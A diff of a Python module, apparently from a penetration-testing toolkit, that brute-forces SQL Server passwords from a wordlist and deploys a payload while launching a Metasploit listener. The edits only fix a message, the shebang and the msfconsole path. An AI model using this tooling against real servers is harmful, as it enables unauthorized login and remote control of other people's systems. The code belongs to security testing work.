@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python
 from src.core.setcore import *
 import src.core.tds as tds
 import sys
@@ -55,7 +55,7 @@ def brute(ipaddr,username,port,wordlist):
             try:
             
                 ipaddr = str(ipaddr)
-                print "Attempting to brute force " + bcolors.BOLD + bcolors.ENDC + " with username of " + bcolors.BOLD + username + bcolors.ENDC + " and password of " + bcolors.BOLD + passwords + bcolors.ENDC
+                print "Attempting to brute force " + bcolors.BOLD + ipaddr + bcolors.ENDC + " with username of " + bcolors.BOLD + username + bcolors.ENDC + " and password of " + bcolors.BOLD + passwords + bcolors.ENDC
 
                 # connect to the sql server and attempt a password
                 if ":" in ipaddr:   
@@ -162,7 +162,7 @@ def deploy_hex2binary(ipaddr,port,username,password):
                 except: import pexpect
                 print_status("Starting the Metasploit listener...")
                 msf_path = meta_path()
-                child2 = pexpect.spawn("%s/msfconsole -r %s/meta_config\r\n\r\n" % (msf_path,setdir))
+                child2 = pexpect.spawn("%smsfconsole -r %s/meta_config\r\n\r\n" % (meta_path(),setdir))
 
         # random executable name
         random_exe = generate_random_string(10,15)
@@ -214,7 +214,7 @@ def deploy_hex2binary(ipaddr,port,username,password):
                 try: reload(pexpect)
                 except: import pexpect
                 print_status("Starting the Metasploit listener...")
-                child2 = pexpect.spawn("%s/msfconsole -r %s/reports/powershell/powershell.rc" % (msf_path,setdir))
+                child2 = pexpect.spawn("%smsfconsole -r %s/reports/powershell/powershell.rc" % (msf_path,setdir))
                 print_status("Waiting for the listener to start first before we continue forward...")
                 print_status("Be patient, Metaploit takes a little bit to start...")
                 child2.expect("Starting the payload handler", timeout=30000)
